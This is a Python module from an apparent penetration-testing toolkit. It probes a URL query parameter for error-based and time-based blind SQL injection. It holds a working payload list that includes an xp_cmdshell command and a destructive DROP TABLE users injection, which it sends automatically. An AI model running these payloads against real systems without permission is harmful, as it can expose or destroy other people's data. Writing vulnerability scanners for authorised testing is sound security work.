"""
modules/vuln_scan/sqli_tester.py — SQL Injection vulnerability tester.

Sends error-based and time-based blind SQLi payloads to a target URL
parameter, checking response bodies for common database error strings
and measuring response times to detect time-based blind injection.
"""

import logging
import time
from pathlib import Path

import requests
from requests.exceptions import RequestException
from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# -----------------------------------------------------------------------
# Error-based SQLi payloads
# -----------------------------------------------------------------------
SQLI_PAYLOADS: list[str] = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1' ORDER BY 3 --",
    "1' UNION SELECT NULL --",
    "1' UNION SELECT NULL,NULL --",
    "1' AND SLEEP(5) --",
    "1; WAITFOR DELAY '0:0:5'",
    "'; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) --",
    "' AND extractvalue(1,concat(0x7e,(SELECT version()))) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))XXXX) AND 1=1",
    "'; DROP TABLE users; --",
]

# -----------------------------------------------------------------------
# DB error string signatures
# -----------------------------------------------------------------------
DB_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "supplied argument is not a valid mysql",
        "column count doesn't match",
        "mysql server version for the right syntax",
    ],
    "PostgreSQL": [
        "pg_query()",
        "pg_exec()",
        "postgresql",
        "syntax error at or near",
        "unterminated quoted identifier",
        "invalid input syntax for type",
    ],
    "MSSQL": [
        "microsoft sql server",
        "odbc sql server driver",
        "unclosed quotation mark",
        "quoted_identifier",
        "syntax error converting",
        "procedure or function",
        "incorrect syntax near",
    ],
    "Oracle": [
        "ora-00933",
        "ora-00907",
        "oracle error",
        "oracle.*driver",
        "warning.*oci_",
        "quoted string not properly terminated",
    ],
    "SQLite": [
        "sqlite_error",
        "sqlite3::query",
        "sqlite3_prepare",
        "sql logic error",
        "no such column",
        "unable to open database file",
    ],
    "Generic": [
        "sql syntax",
        "sql error",
        "database error",
        "query failed",
        "sql command not properly ended",
        "jdbc",
        "syntax error",
        "division by zero",
    ],
}

# Time-based blind threshold in seconds
TIME_THRESHOLD: float = 4.5


class SqliTester(BaseModule):
    """Test a query parameter for error-based and time-based blind SQL injection.

    Iterates over a set of error-based payloads, inspecting responses for
    known database error signatures. Also measures response time to detect
    time-based blind injection (e.g. SLEEP(), WAITFOR DELAY).
    """

    name = "SQLi Tester"
    description = "Tests a query parameter for error-based and time-based blind SQL injection."
    author = "RedKit"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL (e.g. https://example.com/items).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter name to inject into (e.g. id).",
        },
        "timeout": {
            "value": "10",
            "required": False,
            "description": "HTTP request timeout in seconds (default: 10).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _check_errors(self, body: str) -> tuple[bool, str, str]:
        """Scan response body for database error signatures.

        Args:
            body: HTTP response body as a string.

        Returns:
            Tuple of (found: bool, db_type: str, matched_string: str).
        """
        body_lower = body.lower()
        for db_type, patterns in DB_ERROR_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in body_lower:
                    return True, db_type, pattern
        return False, "", ""

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Send all payloads and check for error strings and time delays."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        timeout = int(self.get_option("timeout") or 10)

        config_path = _PROJECT_ROOT / "config.yaml"
        user_agent = "RedKit/1.0 (Authorized Security Testing)"
        try:
            import yaml
            with open(config_path) as f:
                cfg = yaml.safe_load(f)
                user_agent = cfg.get("default_user_agent", user_agent)
        except Exception:
            pass

        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        headers = {"User-Agent": user_agent}
        confirmed_error: set[str] = set()
        confirmed_time: set[str] = set()

        logger.info("SQLi testing: target=%s, param=%s, payloads=%d", target, param, len(SQLI_PAYLOADS))

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing SQLi payloads on {target}", total=len(SQLI_PAYLOADS))

            for payload in SQLI_PAYLOADS:
                progress.advance(task)
                url = f"{target}?{param}={requests.utils.quote(payload)}"
                try:
                    start = time.monotonic()
                    resp = requests.get(url, timeout=timeout, headers=headers, verify=False, allow_redirects=True)
                    elapsed = time.monotonic() - start

                    # Error-based check
                    found, db_type, matched = self._check_errors(resp.text)
                    if found and db_type not in confirmed_error:
                        confirmed_error.add(db_type)
                        logger.warning("SQLi error-based confirmed: %s (DB: %s)", payload, db_type)
                        self._add_finding(
                            finding_type="SQL Injection",
                            severity="CRITICAL",
                            title=f"Error-based SQLi detected ({db_type})",
                            detail=(
                                f"A database error message was observed in the response, indicating "
                                f"unsanitised input is being passed to a {db_type} query. "
                                f"Error signature matched: '{matched}'."
                            ),
                            evidence=f"GET {url}\nPayload: {payload}\nMatched error: '{matched}'\nElapsed: {elapsed:.2f}s",
                        )

                    # Time-based blind check
                    if elapsed >= TIME_THRESHOLD and payload not in confirmed_time:
                        confirmed_time.add(payload)
                        logger.warning("Time-based blind SQLi: %s (%.2fs)", payload, elapsed)
                        self._add_finding(
                            finding_type="SQL Injection (Blind)",
                            severity="CRITICAL",
                            title="Time-based blind SQLi detected",
                            detail=(
                                f"Response time ({elapsed:.2f}s) exceeded the threshold of "
                                f"{TIME_THRESHOLD}s, suggesting a time-delay payload was executed by the database."
                            ),
                            evidence=f"GET {url}\nPayload: {payload}\nResponse time: {elapsed:.2f}s",
                        )

                except RequestException as exc:
                    logger.debug("Request error for SQLi payload '%s': %s", payload, exc)

        total = len(self.get_findings())
        logger.info("SQLi testing complete: %d finding(s).", total)
